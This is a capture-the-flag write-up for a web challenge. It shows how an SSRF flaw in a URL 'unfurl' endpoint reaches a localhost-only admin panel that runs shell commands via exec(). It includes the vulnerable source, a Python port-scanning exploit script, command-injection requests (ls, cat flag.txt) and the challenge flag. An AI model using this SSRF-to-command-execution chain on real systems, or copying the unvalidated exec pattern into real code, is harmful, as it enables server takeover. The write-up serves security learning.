![[Pasted image 20250228190215.png]]

check .zip source code


### Identifying the SSRF Vulnerability

The vulnerability lies in the `/unfurl` functionality, which takes a URL as input and makes an HTTP request to that URL using `axios.get(url)`. Here is the relevant code:

```js
router.post('/unfurl', async (req, res) => {
    const { url } = req.body;

    if (!url) {
        return res.status(400).json({ error: 'No URL provided!' });
    }

    try {
        const response = await axios.get(url); // Vuln here
        const html = response.data;
        const $ = cheerio.load(html);

        const title = $('title').text() || 'No title found';
        const description = $('meta[name="description"]').attr('content') || 'No description found';

        res.json({ title, description, html, image });
    } catch (error) {
        console.error(`[ERROR] Failed to unfurl URL: ${error.message}`);
        res.status(404).json({ error: 'Failed to unfurl the URL.' });
    }
});```

#### Issue

The service does not validate the URL provided by the user, allowing an attacker to specify a URL pointing to internal services (e.g., `http://127.0.0.1:PORT`). This constitutes an **SSRF** because the server makes requests to internal resources based on user input.

---

### 2. Discovering the Internal Admin Panel

The admin panel is hosted on a random port between 1024 and 4999. Here is the relevant code:

```js
function getRandomPort() {
    const MIN_PORT = 1024;
    const MAX_PORT = 4999;
    let port;
    do {
        port = Math.floor(Math.random() * (MAX_PORT - MIN_PORT + 1)) + MIN_PORT;
    } while (port === 5000);
    return port;
}

const adminPort = getRandomPort();
adminApp.listen(adminPort, '127.0.0.1', () => {
    console.log(`[INFO] Admin app running on http://127.0.0.1:${adminPort}`);
});```

#### Issue

Although the admin panel is accessible only from `localhost` (`127.0.0.1`), the SSRF vulnerability allows bypassing this restriction. An attacker can use the `/unfurl` functionality to send requests to `http://127.0.0.1:PORT` and discover the port on which the admin panel is exposed.

---

### 3. Command Execution Functionality

The admin panel exposes a functionality to execute system commands (`/admin/execute`). Here is the relevant code:

```js
router.get('/execute', (req, res) => {
    const clientIp = req.ip;

    // ip address verif
    if (clientIp !== '127.0.0.1' && clientIp !== '::1') {
        console.warn(`[WARN] Unauthorized access attempt from ${clientIp}`);
        return res.status(403).send('Forbidden: Access is restricted to localhost.');
    }

    const cmd = req.query.cmd;

    if (!cmd) {
        return res.status(400).send('No command provided!');
    }

    exec(cmd, (error, stdout, stderr) => {
        if (error) {
            console.error(`[ERROR] Command execution failed: ${error.message}`);
            return res.status(500).send(`Error: ${error.message}`);
        }

        console.log(`[INFO] Command executed: ${cmd}`);
        res.send(`
            <h1>Command Output</h1>
            <pre>${stdout || stderr}</pre>
            <a href="/admin">Back to Admin Panel</a>
        `);
    });
});```

#### Issue

The command execution functionality is supposed to be restricted to `localhost`, but the SSRF vulnerability allows bypassing this restriction. An attacker can exploit this functionality to execute arbitrary commands on the server.

---

### Exploiting the Vulnerability

#### Step 1: Discovering the Admin Panel Port

1. **Using SSRF to scan ports**:
    
    - The SSRF vulnerability allows sending requests to `http://127.0.0.1:PORT` via the `/unfurl` functionality.
        
    - The goal is to scan ports between 1024 and 4999 to find the one on which the admin panel is exposed.
        
2. **Scan script**:
    
    - I wrote a script to automate the port scan. For each port, the script sends a request to `http://127.0.0.1:PORT` via `/unfurl`.
        
    - If the response contains "Admin Panel," it means the port has been found.
        

```python
import requests

UNFURL_URL = 'http://challenge.ctf.games:31214/unfurl' # Your port on the instance

def test_port(port):
    target = f'http://127.0.0.1:{port}'
    data = {'url': target}
    try:
        response = requests.post(UNFURL_URL, json=data, timeout=1)
        if response.status_code == 200:
            html = response.json().get('html', '')
            if 'Admin Panel' in html:
                print(f"Admin panel found on port {port}!")
                return port
    except:
        pass
    return None
def find_admin_port():
    common_ports = [3000, 4000, 5000, 8080, 8000]
    for port in common_ports:
        result = test_port(port)
        if result:
            return result
    for port in range(1024, 5000):
        result = test_port(port)
        if result:
            return result
    
    return None
print("Scanning for admin panel...")
admin_port = find_admin_port()
if admin_port:
    print(f"Admin panel is running on port {admin_port}.")
else:
    print("fuck")```

#### Step 2: Executing Arbitrary Commands

1. **Exploiting the `/execute` functionality**:
    - For example, to execute `ls`, I sent a request to `http://127.0.0.1:PORT/execute?cmd=ls`

![[Pasted image 20250228191819.png]]

I sent a request to `http://127.0.0.1:PORT/execute?cmd=cat%20flag.txt`
%20 = 1 space

![[Pasted image 20250228191757.png]]

```
flag{e1c96ccca8777b15bd0b0c7795d018ed}
```